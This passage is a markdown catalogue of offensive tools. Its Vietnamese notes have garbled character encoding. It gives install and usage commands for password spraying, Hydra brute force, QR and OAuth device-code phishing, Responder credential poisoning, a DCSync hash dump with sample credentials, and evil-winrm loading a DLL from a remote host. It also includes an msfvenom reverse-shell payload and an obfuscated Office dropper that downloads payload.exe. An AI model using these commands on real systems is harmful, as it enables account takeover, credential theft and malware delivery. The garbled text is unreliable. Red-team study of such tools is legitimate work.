python3 ./trevorspray -u emails.txt -p 'Welcome123' --url https://login.windows.net/b43asdas-cdde-bse-ac05-2e37deadbeef/oauth2/token
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **script Python trevorspray**. `--recon` thá»±c hiá»‡n cÃ¡c ká»¹ thuáº­t **recon** (vÃ­ dá»¥: kiá»ƒm tra ngÆ°á»i dÃ¹ng trÃªn cÃ¡c dá»‹ch vá»¥ public nhÆ° **OneDrive**). `-u` vÃ  `-p` chá»‰ Ä‘á»‹nh tá»‡p ngÆ°á»i dÃ¹ng/máº­t kháº©u cho chiáº¿n dá»‹ch spray. `--threads` kiá»ƒm soÃ¡t sá»‘ luá»“ng song song. `--url` chá»‰ Ä‘á»‹nh Ä‘iá»ƒm cuá»‘i xÃ¡c thá»±c má»¥c tiÃªu (á»Ÿ Ä‘Ã¢y lÃ  Ä‘iá»ƒm cuá»‘i OAuth cá»§a Microsoft).

Äá»ƒ biáº¿t hÆ°á»›ng dáº«n sá»­ dá»¥ng Ä‘áº§y Ä‘á»§, xem [táº¡i Ä‘Ã¢y](https://github.com/blacklanternsecurity/TREVORspray?tab=readme-ov-file#how-to---o365).

![TREVORspray](https://github.com/user-attachments/assets/67c64f6d-527a-4b59-8dd9-b73bc68274f4)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/blacklanternsecurity/TREVORspray*

### [ğŸ”™](#tool-list)[**evilqr**](https://github.com/kgretzky/evilqr)

**Toolkit** demonstrates another approach of a **QRLJacking attack**, allowing to perform remote account takeover, through sign-in QR code phishing.

It consists of a browser extension used by the attacker to extract the sign-in QR code and a server application, which retrieves the sign-in QR codes to display them on the hosted phishing pages.

**Demo video** [táº¡i Ä‘Ã¢y](https://www.youtube.com/watch?v=8pfodWzqMcU)

**CÃ i Ä‘áº·t (Tiá»‡n Ã­ch má»Ÿ rá»™ng):**

You can load the extension in Chrome, through `Load unpacked` feature:
https://developer.chrome.com/docs/extensions/mv3/getstarted/development-basics/#load-unpacked

Once the extension is installed, make sure to pin its icon in Chrome's extension toolbar, so that the icon is always visible.
**LÆ°u Ã½:** ÄÃ¢y lÃ  quy trÃ¬nh cÃ i Ä‘áº·t tiá»‡n Ã­ch má»Ÿ rá»™ng Chrome chÆ°a Ä‘Æ°á»£c Ä‘Ã³ng gÃ³i, thá»±c hiá»‡n trong cÃ i Ä‘áº·t cá»§a trÃ¬nh duyá»‡t Chrome.

**CÃ i Ä‘áº·t (**Server**):**

```bash
git clone https://github.com/kgretzky/evilqr;cd evilqr/server/;build_run.bat
```
**LÆ°u Ã½:** Lá»‡nh nÃ y clone mÃ£ nguá»“n, di chuyá»ƒn vÃ o thÆ° má»¥c con server vÃ  cháº¡y má»™t file `.bat` (lá»‡nh batch cá»§a **Windows**) tÃªn `build_run.bat`, cÃ³ kháº£ nÄƒng lÃ  Ä‘á»ƒ build vÃ  cháº¡y server. Thá»±c hiá»‡n trÃªn **Windows**.

**CÃ¡ch sá»­ dá»¥ng:**

1. Run the server by running the built server binary: `./server/build/evilqr-server`
2. Open any of the supported websites in your Chrome browser, with installed **Evil QR** extension:
```
https://discord.com/login
https://web.telegram.org/k/
https://whatsapp.com
https://store.steampowered.com/login/
https://accounts.binance.com/en/login
https://www.tiktok.com/login
```
3. Make sure the sign-in QR code is visible and click the **Evil QR** extension icon in the toolbar. If the QR code is recognized, the icon should light up with colors.
4. Open the server's phishing page URL: `http://127.0.0.1:35000` (default)
**LÆ°u Ã½:** Quy trÃ¬nh táº¥n cÃ´ng chi tiáº¿t: Cháº¡y server (trÃªn mÃ¡y attacker), dÃ¹ng tiá»‡n Ã­ch má»Ÿ rá»™ng Ä‘á»ƒ báº¯t mÃ£ QR Ä‘Äƒng nháº­p tá»« webiste há»£p phÃ¡p (mÃ  attacker Ä‘ang truy cáº­p), sau Ä‘Ã³ dá»¥ náº¡n nhÃ¢n truy cáº­p trang phishing do attacker host (trÃªn mÃ¡y attacker) Ä‘á»ƒ hiá»ƒn thá»‹ mÃ£ QR Ä‘Ã£ báº¯t. Khi náº¡n nhÃ¢n quÃ©t mÃ£ QR nÃ y, há» sáº½ Ä‘Äƒng nháº­p vÃ o tÃ i khoáº£n cá»§a há» trÃªn website há»£p phÃ¡p thÃ´ng qua thiáº¿t bá»‹ cá»§a há» (Ä‘iá»‡n thoáº¡i), vÃ  **server evilqr** cá»§a attacker sáº½ báº¯t Ä‘Æ°á»£c **session** cá»§a náº¡n nhÃ¢n.

![evilqr](https://github.com/user-attachments/assets/00ad78c5-1978-4e59-a522-7e8b9c39b1c3)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://breakdev.org/evilqr-phishing/*

### [ğŸ”™](#tool-list)[**CUPP**](https://github.com/Mebus/cupp)

The most common form of authentication is the combination of a username and a password or passphrase. Passwords can sometimes be guessed profiling the user, such as a birthday, nickname, address, name of a pet or relative, or a common word such as God, love, money or password.

That is why **CUPP** was born.

**Install:**

```bash
git clone https://github.com/Mebus/cupp;cd cupp
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n báº±ng **Git** vÃ  chuyá»ƒn vÃ o thÆ° má»¥c cá»§a cÃ´ng cá»¥.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Run in interactive mode
python3 ./cupp.py -i
```
**LÆ°u Ã½:** Lá»‡nh cháº¡y **script Python cupp.py** á»Ÿ cháº¿ Ä‘á»™ tÆ°Æ¡ng tÃ¡c (`-i`). á» cháº¿ Ä‘á»™ nÃ y, cÃ´ng cá»¥ sáº½ há»i báº¡n má»™t loáº¡t cÃ¢u há»i vá» náº¡n nhÃ¢n Ä‘á»ƒ táº¡o ra má»™t **wordlist** máº­t kháº©u dá»±a trÃªn thÃ´ng tin cÃ¡ nhÃ¢n cá»§a há».

![cupp](https://github.com/user-attachments/assets/39ad1c58-de4e-449a-b2d4-a9629d5ab82c)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/Mebus/cupp*

### [ğŸ”™](#tool-list)[**Bash Bunny**](https://shop.hak5.org/products/bash-bunny)

The **Bash Bunny** is a physical **USB** attack tool and multi-function **payload** delivery system. It is designed to be plugged into a computer's **USB** port and can be programmed to perform a variety of functions, including manipulating and exfiltrating data, installing malware, and bypassing security measures.

[hackinglab: **Bash Bunny** â€“ HÆ°á»›ng dáº«n](https://hackinglab.cz/en/blog/bash-bunny-guide/)

[TÃ i liá»‡u **Hak5**](https://docs.hak5.org/bash-bunny/)

[Repo **Payload** hay](https://github.com/hak5/bashbunny-payloads)

[Trang sáº£n pháº©m](https://hak5.org/products/bash-bunny)

![image](https://user-images.githubusercontent.com/100603074/209868292-cc02ce20-7d8e-4019-b953-7082fb0eb828.png)

### [ğŸ”™](#tool-list)[**EvilGoPhish**](https://github.com/fin3ss3g0d/evilgophish)

evilginx2 + gophish. (**GoPhish**) **Gophish** is a powerful, open-source **phishing framework** that makes it easy to test your organization's exposure to **phishing**. (**evilginx2**) Standalone **man-in-the-middle** attack framework used for phishing login credentials along with **session cookies**, allowing for the bypass of **2-factor authentication**.

**Install:**

```bash
git clone https://github.com/fin3ss3g0d/evilgophish
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n báº±ng **Git**. ÄÃ¢y lÃ  má»™t cÃ´ng cá»¥ tÃ­ch há»£p hai cÃ´ng cá»¥ phishing máº¡nh máº½ lÃ  **evilginx2** vÃ  **GoPhish**.

**CÃ¡ch sá»­ dá»¥ng:**

```
Usage:
./setup <root domain> <subdomain(s)> <root domain bool> <redirect url> <feed bool> <rid replacement> <blacklist bool>
 - root domain                     - tÃªn miá»n gá»‘c sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng cho chiáº¿n dá»‹ch
 - subdomains                      - má»™t danh sÃ¡ch cÃ¡c tÃªn miá»n phá»¥ cá»§a evilginx2 Ä‘Æ°á»£c phÃ¢n tÃ¡ch báº±ng dáº¥u cÃ¡ch, cÃ³ thá»ƒ chá»‰ cÃ³ má»™t
 - root domain bool                - true hoáº·c false Ä‘á»ƒ proxy tÃªn miá»n gá»‘c tá»›i evilginx2
 - redirect url                    - URL Ä‘á»ƒ chuyá»ƒn hÆ°á»›ng cÃ¡c yÃªu cáº§u Apache trÃ¡i phÃ©p
 - feed bool                       - true hoáº·c false náº¿u báº¡n Ä‘á»‹nh sá»­ dá»¥ng live feed
 - rid replacement                 - thay tháº¿ "rid" máº·c Ä‘á»‹nh cá»§a gophish trong cÃ¡c URL phishing báº±ng giÃ¡ trá»‹ nÃ y
 - blacklist bool                  - true hoáº·c false Ä‘á»ƒ sá»­ dá»¥ng blacklist cá»§a Apache
Example:
  ./setup.sh example.com "accounts myaccount" false https://redirect.com/ true user_id false
```
**LÆ°u Ã½:** VÃ­ dá»¥ vá» cÃ¡ch cháº¡y **script setup.sh** Ä‘á»ƒ cáº¥u hÃ¬nh tÃ­ch há»£p **evilginx2** vÃ  **GoPhish** cho má»™t chiáº¿n dá»‹ch cá»¥ thá»ƒ, vá»›i nhiá»u tham sá»‘ khÃ¡c nhau kiá»ƒm soÃ¡t cÃ¡ch thá»©c hoáº¡t Ä‘á»™ng cá»§a **phishing**.

![image](https://user-images.githubusercontent.com/100603074/191007680-890acda1-72ec-429e-9c91-b2cae55d7189.png)

### [ğŸ”™](#tool-list)[**The Social-Engineer Toolkit** (SET)](https://github.com/IO1337/social-engineering-toolkit)

This framework is great for creating campaigns for **initial access**, '**SET** has a number of custom **attack vectors** that allow you to make a believable attack quickly'.

**Install:**

```bash
git clone https://github.com/IO1337/social-engineering-toolkit; cd set; python setup.py install
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t tá»« mÃ£ nguá»“n trÃªn há»‡ thá»‘ng cÃ³ **Git** vÃ  **Python**, sá»­ dá»¥ng **script setup.py** tiÃªu chuáº©n.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
python3 setoolkit
```
**LÆ°u Ã½:** Lá»‡nh cháº¡y cÃ´ng cá»¥ **SET** á»Ÿ cháº¿ Ä‘á»™ tÆ°Æ¡ng tÃ¡c, hiá»ƒn thá»‹ menu cÃ¡c tÃ¹y chá»n táº¥n cÃ´ng **social engineering** khÃ¡c nhau.

![image](https://user-images.githubusercontent.com/100603074/191690233-e1f4255a-514e-4887-94da-b8a3396025f0.png)

### [ğŸ”™](#tool-list)[**Hydra**](https://github.com/vanhauser-thc/thc-hydra)

Nice tool for logon brute force attacks. Can bf a number of services including **SSH, FTP, TELNET, HTTP** etc.

**Install:**

```bash
sudo apt install hydra
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n trÃªn **Linux/Debian/Ubuntu** sá»­ dá»¥ng **apt**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 http-post-form "login.php:username-^USER^&password=^PASS^:Error"
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 ssh
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **Hydra** cho **brute force**.
DÃ²ng Ä‘áº§u tiÃªn thá»±c hiá»‡n **brute force** dá»±a trÃªn form POST cá»§a HTTP, chá»‰ Ä‘á»‹nh file ngÆ°á»i dÃ¹ng (`-L`), file máº­t kháº©u (`-P`), IP má»¥c tiÃªu vÃ  cáº¥u trÃºc cá»§a form login, bao gá»“m cáº£ chuá»—i bÃ¡o lá»—i.
DÃ²ng thá»© hai thá»±c hiá»‡n **brute force** Ä‘Äƒng nháº­p **SSH** sá»­ dá»¥ng cÃ¹ng file ngÆ°á»i dÃ¹ng vÃ  máº­t kháº©u.

![image](https://user-images.githubusercontent.com/100603074/193459614-365876d5-09da-4f29-b850-0480944f0097.png)

### [ğŸ”™](#tool-list)[**SquarePhish**](https://github.com/secureworks/squarephish)

**SquarePhish** is an advanced phishing tool that uses a technique combining **OAuth Device code authentication flow** and **QR codes** (See [PhishInSuits](https://github.com/secureworks/PhishInSuits) for more about **OAuth Device Code flow** for phishing attacks).

Attack Steps:

- Send malicious **QR code** to victim
- Victim scans **QR code** with mobile device
- Victim directed to attacker controlled server (Triggering **OAuth Device Code authentication flow** process)
- Victim emailed **MFA** code (Triggering **OAuth Device Code flow** 15 minute timer)
- Attacker polls for authentication
- Victim enters code into legit Microsoft website
- Attacker saves authentication token

**Install:**

```bash
git clone https://github.com/secureworks/squarephish; cd squarephish; pip install -r requirements.txt
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n cho há»‡ thá»‘ng cÃ³ **Git** vÃ  **Python**.

**Note:** *Before using either module, update the required information in the settings.config file noted with `Required`.*

**CÃ¡ch sá»­ dá»¥ng (Email Module):**

```
usage: squish.py email [-h] [-c CONFIG] [--debug] [-e EMAIL]

optional arguments:
  -h, --help            show this help message and exit

  -c CONFIG, --config CONFIG
                        tá»‡p cáº¥u hÃ¬nh squarephish [Máº·c Ä‘á»‹nh: settings.config]

  --debug               cho phÃ©p debug server

  -e EMAIL, --email EMAIL
                        Ä‘á»‹a chá»‰ email cá»§a náº¡n nhÃ¢n Ä‘á»ƒ gá»­i email mÃ£ QR ban Ä‘áº§u Ä‘áº¿n
```
**LÆ°u Ã½:** Trá»£ giÃºp sá»­ dá»¥ng **script squish.py** vá»›i subcommand `email`.

**CÃ¡ch sá»­ dá»¥ng (Server Module):**

```
usage: squish.py server [-h] [-c CONFIG] [--debug]

optional arguments:
  -h, --help            show this help message and exit

  -c CONFIG, --config CONFIG
                        tá»‡p cáº¥u hÃ¬nh squarephish [Máº·c Ä‘á»‹nh: settings.config]

  --debug               cho phÃ©p debug server
```
**LÆ°u Ã½:** Trá»£ giÃºp sá»­ dá»¥ng **script squish.py** vá»›i subcommand `server`.

![image](https://user-images.githubusercontent.com/100603074/208217359-70e3ebd4-5cbf-40b9-9e4b-ca1608e4422f.png)

### [ğŸ”™](#tool-list)[**King Phisher**](https://github.com/securestate/king-phisher)

**King Phisher** is a tool that allows attackers to create and send phishing emails to victims to obtain sensitive information.

It includes features like customizable templates, campaign management, and email sending capabilities, making it a powerful and easy-to-use tool for carrying out phishing attacks. With **King Phisher**, atackers can target individuals or organizations with targeted and convincing phishing emails, increasing the chances of success in their attacks.

**CÃ i Ä‘áº·t (Linux - Client & Server):**

```bash
wget -q https://github.com/securestate/king-phisher/raw/master/tools/install.sh && \
sudo bash ./install.sh
```
**LÆ°u Ã½:** Táº£i vÃ  thá»±c thi **script cÃ i Ä‘áº·t** trÃªn **Linux/Debian/Ubuntu**. YÃªu cáº§u **wget** vÃ  quyá»n **super user**.

**CÃ¡ch sá»­ dá»¥ng:**

Once **King Phisher** has been installed please follow the [wiki page](https://github.com/rsmusllp/king-phisher/wiki/Getting-Started) to setup **SSH, Database config, SMTP server** etc.
**LÆ°u Ã½:** **King Phisher** lÃ  má»™t **framework phishing** cÃ³ giao diá»‡n ngÆ°á»i dÃ¹ng (web hoáº·c GUI?), yÃªu cáº§u thiáº¿t láº­p backend nhÆ° database, server SMTP Ä‘á»ƒ gá»­i email vÃ  server Ä‘á»ƒ host cÃ¡c trang phishing. HÆ°á»›ng dáº«n chi tiáº¿t hÆ¡n náº±m trÃªn wiki cá»§a dá»± Ã¡n.

![image](https://user-images.githubusercontent.com/100603074/208217377-a6d36613-4ffe-486d-a630-99ed1bb7ed2d.png)

**Execution**
====================

### [ğŸ”™](#tool-list)[**Responder**](https://github.com/SpiderLabs/Responder)

**Responder** is a tool for poisoning the **LLMNR** and **NBT-NS** protocols on a network, to allow for credential capture and arbitrary code execution.

The **LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)** protocols are used by Windows systems to resolve hostnames to IP addresses on a local network. If a hostname cannot be resolved using these protocols, the system will broadcast a request for the hostname to the local network.

**Responder** listens for these broadcasts and responds with a fake IP address, tricking the requesting system into sending its credentials to the attacker.

**Install:**

```bash
git clone https://github.com/SpiderLabs/Responder#usage
cd Responder
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n báº±ng **Git**. Responder Ä‘Æ°á»£c viáº¿t báº±ng **Python**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Running the tool
./Responder.py [options]

# Typical usage
./Responder.py -I eth0 -wrf
```
**LÆ°u Ã½:**
`./Responder.py [options]`: CÃº phÃ¡p chung Ä‘á»ƒ cháº¡y script **Responder.py** vá»›i cÃ¡c tÃ¹y chá»n khÃ¡c nhau.
`./Responder.py -I eth0 -wrf`: Cháº¡y **Responder** trÃªn giao diá»‡n máº¡ng `eth0`.
`-w`: KÃ­ch hoáº¡t web server Ä‘á»ƒ thu tháº­p thÃ´ng tin xÃ¡c thá»±c **HTTP/HTTPS/SMB**.
`-r`: KÃ­ch hoáº¡t bá»™ pháº­n nháº­n **SMB/HTTP** cá»§a **Responder**.
`-f`: Buá»™c bá»™ nháº­n **SMB/HTTP** chuyá»ƒn tiáº¿p káº¿t ná»‘i xÃ¡c thá»±c há»£p phÃ¡p cho mÃ¡y chá»§ gá»‘c (khÃ´ng báº¯t buá»™c).
Sá»­ dá»¥ng trÃªn **Linux**, láº¯ng nghe cÃ¡c truy váº¥n tÃªn trÃªn máº¡ng cá»¥c bá»™ vÃ  tráº£ lá»i giáº£ máº¡o Ä‘á»ƒ thu tháº­p **hash** (thÆ°á»ng lÃ  **NTLMv2**).

Full usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/SpiderLabs/Responder#usage).

![image](https://user-images.githubusercontent.com/100603074/210266150-b9cbd4a0-d07b-435a-8fa9-bc0b88d2c6ae.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/*

### [ğŸ”™](#tool-list)[**secretsdump**](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

A utility that is part of the **Impacket** library that can be used to extract password hashes and other secrets from a Windows system.

It does this by interacting with the **Security Account Manager (SAM)** database on the system and extracting the hashed passwords and other information, such as:

- Password hashes for local accounts
- Kerberos tickets and keys
- LSA Secrets

**Install:**

```bash
python3 -m pip install impacket
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t thÆ° viá»‡n **Impacket** cho **Python 3** báº±ng `pip`.

**CÃ i Ä‘áº·t (Vá»›i Example Scripts):**

Download and extract [gÃ³i](https://github.com/fortra/impacket), then navigate to the install folder and run...

```bash
python3 -m pip install .
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **Impacket** tá»« mÃ£ nguá»“n Ä‘Ã£ táº£i vá» Ä‘á»ƒ cÃ³ cÃ¡c **script** vÃ­ dá»¥ trong thÆ° má»¥c `examples`.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# TrÃ­ch xuáº¥t hash NTLM vá»›i cÃ¡c file cá»¥c bá»™
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# DCSync attack vÃ  dump cÃ¡c hash NTLM cá»§a táº¥t cáº£ ngÆ°á»i dÃ¹ng domain.
secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
```
**LÆ°u Ã½:** **secretsdump.py** lÃ  má»™t trong nhiá»u **script** tiá»‡n Ã­ch cá»§a **Impacket**.
DÃ²ng Ä‘áº§u tiÃªn: Thá»±c hiá»‡n **dump hash** cá»¥c bá»™ báº±ng cÃ¡ch cung cáº¥p Ä‘Æ°á»ng dáº«n Ä‘áº¿n file **NTDS.dit** (chá»©a **hash** AD) vÃ  **SYSTEM hive** (chá»©a khÃ³a giáº£i mÃ£). Cáº§n pháº£i láº¥y Ä‘Æ°á»£c cÃ¡c file nÃ y tá»« **Domain Controller** (thÆ°á»ng báº±ng cÃ¡c ká»¹ thuáº­t khÃ¡c).
DÃ²ng thá»© hai: Thá»±c hiá»‡n cuá»™c táº¥n cÃ´ng **DCSync**, giáº£ máº¡o lÃ  má»™t **Domain Controller** khÃ¡c vÃ  yÃªu cáº§u **DC** má»¥c tiÃªu gá»­i láº¡i **hash** máº­t kháº©u cá»§a cÃ¡c Ä‘á»‘i tÆ°á»£ng AD. ÄÃ¢y lÃ  má»™t ká»¹ thuáº­t máº¡nh máº½ Ä‘á»ƒ **dump hash** tá»« xa mÃ  khÃ´ng cáº§n **SysAdmin**. YÃªu cáº§u thÃ´ng tin xÃ¡c thá»±c **domain** cÃ³ quyá»n Ä‘á»§ Ä‘á»ƒ thá»±c hiá»‡n **DCSync** (thÆ°á»ng lÃ  quáº£n trá»‹ viÃªn domain).

Báº£n [**cheat sheet**](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/) ráº¥t há»¯u Ã­ch cho cÃ¡ch sá»­ dá»¥ng **Impacket**.

![image](https://user-images.githubusercontent.com/100603074/210266110-8f60d6e8-009a-4dea-9e33-8a712aeaf2ac.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy*

### [ğŸ”™](#tool-list)[**evil-winrm**](https://github.com/Hackplayers/evil-winrm)

**Evil-WinRM** is a tool that provides a command line interface for **Windows Remote Management (WinRM**: *A service that allows administrators to remotely execute commands on a Windows machine*).

**Evil-WinRM** allows an attacker to remotely connect to a Windows machine using **WinRM** and execute arbitrary commands.

Some features include:

- Loading in memory **Powershell scripts**
- Loading in memory **dll files** bypassing some AVs
- Loading **x64 payloads**
- **Pass-the-hash** support
- Uploading and downloading local and remote files

**Install: (Git)**

```bash
sudo gem install winrm winrm-fs stringio logger fileutils
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t dependencies lÃ  gem **Ruby** (cáº§n cÃ i Ä‘áº·t **Ruby**), sau Ä‘Ã³ clone mÃ£ nguá»“n.

**Install: (Ruby gem)**

```bash
gem install evil-winrm
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **Evil-WinRM** nhÆ° má»™t gem **Ruby**. PhÆ°Æ¡ng phÃ¡p Ä‘Æ¡n giáº£n hÆ¡n náº¿u Ä‘Ã£ cÃ³ mÃ´i trÆ°á»ng **Ruby**.

Alternative installation instructions can be found [táº¡i Ä‘Ã¢y](https://github.com/Hackplayers/evil-winrm#installation--quick-start-4-methods).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Káº¿t ná»‘i tá»›i 192.168.1.100 vá»›i tÆ° cÃ¡ch Administrator vÃ  cÃ¡c thÆ° má»¥c download exe/ps1 tÃ¹y chá»‰nh
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

# Táº£i lÃªn cÃ¡c file cá»¥c bá»™ Ä‘áº¿n náº¡n nhÃ¢n
upload local_filename
upload local_filename destination_filename

# Táº£i xuá»‘ng cÃ¡c file tá»« xa vá» mÃ¡y cá»¥c bá»™
download remote_filename
download remote_filename destination_filename

# Thá»±c thi .Net assembly vÃ o bá»™ nhá»› náº¡n nhÃ¢n
Invoke-Binary /opt/csharp/Rubeus.exe

# Load DLL library vÃ o bá»™ nhá»› náº¡n nhÃ¢n
Dll-Loader -http http://10.10.10.10/SharpSploit.dll
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  cÃ¡c vÃ­ dá»¥ vá» cÃ¡c lá»‡nh Ä‘Æ°á»£c sá»­ dá»¥ng *bÃªn trong shell evil-winrm* sau khi Ä‘Ã£ káº¿t ná»‘i thÃ nh cÃ´ng Ä‘áº¿n mÃ¡y **Windows** má»¥c tiÃªu thÃ´ng qua **WinRM**. Báº¡n cáº§n cung cáº¥p IP, tÃªn ngÆ°á»i dÃ¹ng vÃ  máº­t kháº©u (`-i`, `-u`, `-p`) Ä‘á»ƒ káº¿t ná»‘i. CÃ¡c lá»‡nh `upload`, `download`, `Invoke-Binary`, `Dll-Loader` lÃ  cÃ¡c tÃ­nh nÄƒng cá»§a **evil-winrm** Ä‘á»ƒ tÆ°Æ¡ng tÃ¡c vá»›i há»‡ thá»‘ng tá»« xa.

Full usage documentation can be found [táº¡i Ä‘Ã¢y](https://github.com/Hackplayers/evil-winrm#documentation).

![image](https://user-images.githubusercontent.com/100603074/210266192-ad53c125-7b3b-4a91-89c1-01c42cb21ef3.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://korbinian-spielvogel.de/posts/heist-writeup/*

### [ğŸ”™](#tool-list)[**Donut**](https://github.com/TheWover/donut/)

A tool for in-memory execution of **VBScript, JScript, EXE, DLL** files and **dotNET assemblies**. It can be used to load and run custom **payloads** on target systems without the need to drop files to disk.

**CÃ i Ä‘áº·t: (**Windows**)**

```bash
git clone http://github.com/thewover/donut.git
```

To generate the loader template, dynamic library **donut.dll**, the static library **donut.lib** and the generator **donut.exe**. Start an x64 Microsoft Visual Studio Developer Command Prompt, change to the directory where you cloned the **Donut** repository and enter the following:

```bash
nmake -f Makefile.msvc
```
**LÆ°u Ã½:** Sá»­ dá»¥ng `nmake` (Microsoft Program Maintenance Utility) vá»›i Makefile.msvc Ä‘á»ƒ build **Donut**. YÃªu cáº§u mÃ´i trÆ°á»ng build cá»§a **Visual Studio**.

To do the same, except using **MinGW-64** on **Windows** or **Linux**, change to the directory where you cloned the **Donut** repository and enter the following:

```bash
make -f Makefile.mingw
```
**LÆ°u Ã½:** Sá»­ dá»¥ng `make` vá»›i Makefile.mingw Ä‘á»ƒ build **Donut** trÃªn cÃ¡c mÃ´i trÆ°á»ng sá»­ dá»¥ng **MinGW-64** hoáº·c **Linux**.

**CÃ i Ä‘áº·t: (Linux)**

```bash
pip3 install donut-shellcode
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t thÆ° viá»‡n **Python** liÃªn quan Ä‘áº¿n viá»‡c táº¡o **shellcode Donut** thÃ´ng qua `pip`.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Creating shellcode from an XSL file that pops up a calculator.
shellcode = donut.create(file=r"C:\\Tools\\Source\\Repos\\donut\\calc.xsl")

# Creating shellcode from an unmanaged DLL. Invokes DLLMain.
shellcode = donut.create(file=r"C:\Tools\Source\Repos\donut\payload\test\hello.dll")
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ nÃ y thá»ƒ hiá»‡n cÃ¡ch sá»­ dá»¥ng thÆ° viá»‡n **Python** Ä‘á»ƒ táº¡o **shellcode** tá»« má»™t tá»‡p Ä‘áº§u vÃ o (`calc.xsl` hoáº·c `hello.dll`). `donut.create()` lÃ  hÃ m chÃ­nh Ä‘á»ƒ táº¡o **shellcode**. **Shellcode** nÃ y sau Ä‘Ã³ cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c thi trong bá»™ nhá»› báº±ng cÃ¡c ká»¹ thuáº­t khÃ¡c.

For full usage information, see the donut [GitHub Page](https://github.com/TheWover/donut/#4-usage).

See [a recent blog post](https://thewover.github.io/Bear-Claw/) from The Wover for more info.

![image](https://user-images.githubusercontent.com/100603074/210077893-9d42cc2f-0ea0-414f-8103-42e29429321b.png)

### [ğŸ”™](#tool-list)[**Macro_pack**](https://github.com/sevagas/macro_pack)

A tool used to automatize the obfuscation and generation of Office documents, **VB scripts**, **shortcuts**, and other formats for **red teaming**.

**CÃ i Ä‘áº·t (Binary):**

1. Get the latest binary from [https://github.com/sevagas/macro_pack/releases/](https://github.com/sevagas/macro_pack/releases/)
2. Download binary on PC with genuine Microsoft Office installed.
3. Open console, **CD** to binary dir and call the binary
**LÆ°u Ã½:** PhÆ°Æ¡ng phÃ¡p cÃ i Ä‘áº·t báº±ng cÃ¡ch táº£i xuá»‘ng file thá»±c thi trá»±c tiáº¿p.

**CÃ i Ä‘áº·t: (Git)**

```bash
git clone https://github.com/sevagas/macro_pack.git
cd macro_pack
pip3 install -r requirements.txt
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tá»« mÃ£ nguá»“n báº±ng **Git** vÃ  **Python**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Help Page
python3 macro_pack.py  --help

# Liá»‡t kÃª táº¥t cáº£ cÃ¡c Ä‘á»‹nh dáº¡ng file Ä‘Æ°á»£c há»— trá»£
macro_pack.exe --listformats
# Che giáº¥u file vba Ä‘Æ°á»£c táº¡o bá»Ÿi msfvenom vÃ  Ä‘áº·t káº¿t quáº£ vÃ o má»™t file VBA má»›i.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba

# Che giáº¥u file VBA stager cá»§a Empire vÃ  táº¡o tÃ i liá»‡u MS Word:
macro_pack.exe -f empire.vba -o -G myDoc.docm

# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm"

# Execute calc.exe via Dynamic Data Exchange (DDE) attack
echo calc.exe | macro_pack.exe --dde -G calc.xslx
```
